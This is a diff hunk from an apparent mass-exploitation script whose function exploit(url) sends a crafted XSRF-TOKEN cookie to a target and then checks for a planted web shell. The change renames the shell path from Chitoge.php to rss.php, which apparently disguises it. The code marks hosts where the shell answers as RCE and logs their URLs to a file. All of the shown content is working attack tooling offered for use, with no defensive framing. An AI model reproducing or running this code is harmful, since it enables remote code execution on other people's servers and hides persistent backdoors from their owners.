@@ -272,11 +272,11 @@ def exploit(url):
                 cokk = {"XSRF-TOKEN": matamu}
                 curler = requests.get(url, cookies=cokk, verify=False, timeout=8, headers=headers).text
                 y = curler.split("</html>")[1]
-                cekshell = requests.get(url + '/Chitoge.php?Chitoge', verify=False, timeout=8, headers=headers).text
+                cekshell = requests.get(url + '/rss.php?Chitoge', verify=False, timeout=8, headers=headers).text
                 if 'Chitoge kirisaki' in cekshell:
                     text += ' | \033[32;1mRCE\033[0m'
                     save = open(o_shell, 'a')
-                    save.write(url + '/Chitoge.php?Chitoge' + '\n')
+                    save.write(url + '/rss.php?Chitoge' + '\n')
                     save.close()
                 else:
                     text += ' | \033[31;1mRCE\033[0m'
